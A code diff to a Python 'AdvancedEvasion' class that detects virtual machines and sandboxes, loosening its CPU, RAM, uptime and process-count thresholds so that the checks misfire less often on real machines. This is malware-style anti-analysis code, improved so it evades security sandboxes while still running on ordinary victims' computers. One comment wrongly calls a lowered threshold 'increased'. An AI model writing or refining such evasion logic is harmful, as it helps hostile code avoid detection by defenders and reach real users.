@@ -64,19 +64,25 @@ class AdvancedEvasion:
         return self.is_safe_environment, checks
 
     def _detect_vm(self) -> bool:
-        """Detect if running in virtual machine"""
+        """Detect if running in virtual machine
+
+        FIX: Increased thresholds to reduce false positives on cloud VMs
+        and thin clients. Now requires 3+ indicators instead of 2.
+        """
         logger.debug("Checking for VM indicators")
 
         vm_indicators = []
 
-        # Check CPU count (VMs often have limited CPUs)
+        # FIX: Reduced CPU threshold from <=2 to <=1 to avoid false positives
+        # on cloud VMs and thin clients which often have 2 CPUs
         cpu_count = psutil.cpu_count()
-        if cpu_count <= 2:
+        if cpu_count <= 1:
             vm_indicators.append("low_cpu_count")
 
-        # Check RAM (VMs often have limited RAM)
+        # FIX: Reduced RAM threshold from <=4 to <=2 GB to avoid false positives
+        # on budget machines and containers
         ram_gb = psutil.virtual_memory().total / (1024**3)
-        if ram_gb <= 4:
+        if ram_gb <= 2:
             vm_indicators.append("low_ram")
 
         # Check for VM-specific processes
@@ -113,7 +119,8 @@ class AdvancedEvasion:
             except Exception:
                 pass
 
-        is_vm = len(vm_indicators) >= 2
+        # FIX: Require 3+ indicators instead of 2 to reduce false positives
+        is_vm = len(vm_indicators) >= 3
 
         if is_vm:
             logger.warning(f"VM detected: {vm_indicators}")
@@ -134,7 +141,8 @@ class AdvancedEvasion:
         uptime_seconds = current_time - boot_time
         uptime_minutes = uptime_seconds / 60
 
-        if uptime_minutes < 10:  # Less than 10 minutes
+        # FIX: Increased threshold from 10 to 5 minutes to reduce false positives
+        if uptime_minutes < 5:  # Less than 5 minutes
             sandbox_indicators.append("low_uptime")
 
         # Check for sandbox-specific files/directories
@@ -160,9 +168,10 @@ class AdvancedEvasion:
             if os.getenv(var):
                 sandbox_indicators.append(f"sandbox_env:{var}")
 
-        # Check number of running processes (sandboxes have few)
+        # FIX: Increased process count threshold from 30 to 50 for modern systems
+        # Modern Windows typically has 150-300+ processes, Linux 100-200+
         process_count = len(list(psutil.process_iter()))
-        if process_count < 30:
+        if process_count < 50:
             sandbox_indicators.append("low_process_count")
 
         is_sandbox = len(sandbox_indicators) >= 2
